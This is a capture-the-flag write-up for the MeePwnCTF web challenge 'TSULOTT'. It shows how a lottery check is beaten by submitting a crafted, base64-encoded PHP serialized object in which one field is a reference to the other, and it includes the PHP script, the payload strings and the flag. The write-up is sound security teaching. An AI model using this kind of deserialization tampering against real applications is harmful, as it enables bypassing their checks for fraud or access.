# TSULOTT (Web 100)

Author: jokker

> Who Wants to Be a Millionaire? Join My LOTT and Win JACKPOTTTT!!!
> Remote: 128.199.190.23:8001

On the challenge website, we have three options:
* Generate a code with 6 numbers
* Enter the code to check if we have won the jackpot
* Showing the php code of the site by submitting *is_debug=1* as GET-parameter

If we submit any 6 numbers to the site, we get a base64 encoded string back:

```
Tzo2OiJPYmplY3QiOjI6e3M6NzoiamFja3BvdCI7TjtzOjU6ImVudGVyIjtzOjE3OiIwMSAwMiAwMyAwNCAwNSAwNiI7fQ==
```

Decoding this string gives us a represantation of an PHP serialized object:

```
O:6:"Object":2:{s:7:"jackpot";N;s:5:"enter";s:17:"01 02 03 04 05 06";}
```

Because of the source-code, we know that the we win the jackpot if the string *enter* equals the string *jackpot*. But jackpot is generated after we submit our numbers. So how can we solve this?

We are in control of the serialized object and luckely, PHP does support references, so we construct an object, where *enter* points to *jackpot* and like this, both hold the same value when checked.

```
<?php
class Object 
{ 
  var $jackpot;
  var $enter; 
} 

$lotto = new Object;
$lotto->jackpot = "01 02 03 04 05 06";
$lotto->enter =& $lotto->jackpot;

echo serialize($lotto);
?>
```

Running this script will give us the following serialized string:

```
O:6:"Object":2:{s:7:"jackpot";s:17:"01 02 03 04 05 06";s:5:"enter";R:2;}
```

And after base64 encoding it, we can submit the final string to the challenge site:

```
Tzo2OiJPYmplY3QiOjI6e3M6NzoiamFja3BvdCI7czoxNzoiMDEgMDIgMDMgMDQgMDUgMDYiO3M6NToiZW50ZXIiO1I6Mjt9
```

Yeesss, we won the jackpot :P

**MeePwnCTF{__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___}**